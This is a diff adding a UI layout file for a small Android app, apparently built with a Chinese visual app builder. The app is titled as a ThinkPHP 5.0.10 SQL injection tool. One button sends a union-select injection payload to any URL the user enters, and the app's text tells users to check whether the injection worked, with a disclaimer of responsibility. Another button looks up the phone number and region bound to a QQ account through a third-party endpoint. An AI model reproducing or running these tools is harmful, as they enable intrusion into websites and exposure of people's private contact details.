@@ -1,0 +1,229 @@
+<View id="2" did="0" type="LinearLayout">
+<ppt>width=-1
+height=50dp
+orientation=horizontal
+gravity=center_vertical
+background=#3385ff</ppt>
+<event></event>
+</View>
+<View id="10" did="2" type="TextView">
+<ppt>width=-1
+height=-2
+text=thinkphp5.0.10sql注入漏洞
+textColor=#ffffff
+textSize=16sp
+layout_weight=1
+textStyle=bold
+layout_marginLeft=200
+</ppt>
+<event></event>
+</View>
+<View id="22" did="0" type="LinearLayout">
+<ppt>width=-1
+height=-1
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="1" did="22" type="LinearLayout">
+<ppt>width=-1
+height=-1
+orientation=vertical
+gravity=center_horizontal</ppt>
+<event></event>
+</View>
+<View id="3" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=15dp</ppt>
+<event></event>
+</View>
+<View id="4" did="3" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="5" did="4" type="EditText">
+<ppt>width=-1
+height=-1
+text=
+hint=请输入url
+textSize=15sp
+background=#ffffffff
+layout_marginLeft=10dp
+textCursorDrawable=#FF00B2FF
+layout_marginRight=10dp
+</ppt>
+<event></event>
+</View>
+<View id="14" did="1" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=horizontal
+layout_marginRight=20dp
+layout_marginLeft=20dp</ppt>
+<event></event>
+</View>
+<View id="6" did="14" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginRight=5dp
+layout_marginTop=15dp
+layout_weight=1</ppt>
+<event></event>
+</View>
+<View id="7" did="6" type="LinearLayout">
+<ppt>width=-1
+height=42dp
+orientation=vertical
+gravity=center
+background=#3385ff</ppt>
+<event><eventItme type="clicki">
+
+ug(5,"text",a)
+
+f(a=="")
+{
+  tws(v,"请输入qq号",0)
+}
+else
+{
+  t()
+  {
+ ss("http://7lun.cc/qb/qb1.php?qq="+a,b)
+
+hs(b,c)
+syso(c)
+ufnsui()
+{
+  json(c,jo)
+  json(jo,"get","message",d)
+  json(jo,"get","phone",e)
+  json(jo,"get","phonediqu",f)
+  ss("结果:"+d,jg)
+  ss("手机号:"+e,sjh)
+  ss("归属地:"+f,gsd)
+  us(26,"text",jg+"\n"+sjh+"\n"+gsd)
+}
+    }
+        }
+ </eventItme></event>
+</View>
+<View id="8" did="7" type="TextView">
+<ppt>width=-2
+height=-2
+text=查询Q绑
+textColor=#ffffff
+textStyle=bold
+textSize=16sp</ppt>
+<event></event>
+</View>
+<View id="23" did="7" type="CoordinatorLayout">
+<ppt>width=-2
+height=-2</ppt>
+<event></event>
+</View>
+<View id="27" did="6" type="LinearLayout">
+<ppt>width=-1
+height=42dp
+orientation=vertical
+gravity=center
+background=#3385ff
+</ppt>
+<event><eventItme type="clicki">
+
+ug(5,"text",a)
+
+f(a=="")
+{
+  tws(v,"请输入url",0)
+}
+else
+{
+  t()
+  {
+ ss(a+"/?name[0]=not like&name[1][0]=%%&name[1][1]=233&name[2]=) union select 1,database(),user()--",b)
+ syso(b)
+hw(b)
+
+ufnsui()
+{
+us(26,"text","已执行完成，自行查看网页是否注入成功")
+ }
+ }
+    }
+ </eventItme></event>
+</View>
+<View id="28" did="27" type="TextView">
+<ppt>width=-2
+height=-2
+text=开始注入
+textColor=#ffffff
+textStyle=bold
+textSize=16sp</ppt>
+<event></event>
+</View>
+<View id="29" did="27" type="CoordinatorLayout">
+<ppt>width=-2
+height=-2</ppt>
+<event></event>
+</View>
+<View id="18" did="14" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginLeft=2.5dp
+layout_marginRight=2.5dp
+layout_marginTop=15dp
+layout_weight=1</ppt>
+<event></event>
+</View>
+<View id="11" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=8dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=15dp
+visibility=gone</ppt>
+<event></event>
+</View>
+<View id="21" did="11" type="VideoView">
+<ppt>width=-1
+height=-2</ppt>
+<event></event>
+</View>
+<View id="24" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=10dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=25dp</ppt>
+<event></event>
+</View>
+<View id="25" did="24" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="26" did="25" type="TextView">
+<ppt>width=-2
+height=-2
+text=1.目标网站须为对应版本\n2.把url粘贴进输入框\n3.然后点击按钮\n4.使用软件所造成一切问题与作者无关
+layout_margin=12dp
+textIsSelectable=true
+textSize=15sp</ppt>
+<event></event>
+</View>
+<UIEventset><eventItme type="loading">uycl(true)</eventItme></UIEventset>
